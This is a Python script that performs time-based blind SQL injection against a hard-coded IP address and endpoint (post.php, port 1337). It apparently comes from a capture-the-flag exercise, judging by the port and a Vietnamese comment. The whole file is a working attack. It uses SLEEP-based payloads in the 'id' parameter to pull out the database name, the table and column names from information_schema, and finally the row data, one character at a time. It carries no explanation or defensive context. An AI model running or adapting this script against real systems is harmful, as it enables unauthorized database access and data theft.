import requests
import time

url = "https://146.190.103.161:1337/post.php"
timeout_threshold = 4
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@{}.-:$ "
max_length = 50
max_rows = 10  # giới hạn số lượng dòng lấy ra (để thử nghiệm)

def time_based_sqli(query_template, label="Result"):
    extracted = ""
    for i in range(1, max_length + 1):
        found = False
        for c in charset:
            payload = query_template.format(i=i, c=c)
            start = time.time()
            try:
                requests.get(url, params={"id": payload}, timeout=timeout_threshold + 2)
                elapsed = time.time() - start
            except requests.exceptions.ReadTimeout:
                elapsed = timeout_threshold + 2

            if elapsed > timeout_threshold:
                extracted += c
                print(f"[+] {label} Char {i}: {c} --> {extracted}")
                found = True
                break
        if not found:
            break
    return extracted

# Step 1: Get database name
print("\n[+] Getting database name...")
db_name = time_based_sqli(
    "1 AND IF(SUBSTRING((SELECT DATABASE()),{i},1)='{c}',SLEEP(5),0)",
    label="DB"
)

# Step 2: Get table names
print("\n[+] Getting table names...")
table_names = []
for row in range(max_rows):
    table = time_based_sqli(
        f"1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {row},1),{{i}},1)='{{c}}',SLEEP(5),0)",
        label=f"Table {row}"
    )
    if table:
        table_names.append(table)
    else:
        break

# Step 3: Get column names per table
all_columns = {}
for table in table_names:
    print(f"\n[+] Getting columns for table: {table}")
    columns = []
    for row in range(max_rows):
        col = time_based_sqli(
            f"1 AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {row},1),{{i}},1)='{{c}}',SLEEP(5),0)",
            label=f"Col {table}.{row}"
        )
        if col:
            columns.append(col)
        else:
            break
    all_columns[table] = columns

# Step 4: Dump data
for table, columns in all_columns.items():
    print(f"\n[+] Dumping data from table: {table}")
    for row in range(max_rows):
        row_data = {}
        for col in columns:
            value = time_based_sqli(
                f"1 AND IF(SUBSTRING((SELECT {col} FROM {table} LIMIT {row},1),{{i}},1)='{{c}}',SLEEP(5),0)",
                label=f"{table}.{col}[{row}]"
            )
            if value:
                row_data[col] = value
        if row_data:
            print(f"  Row {row}: {row_data}")
        else:
            break
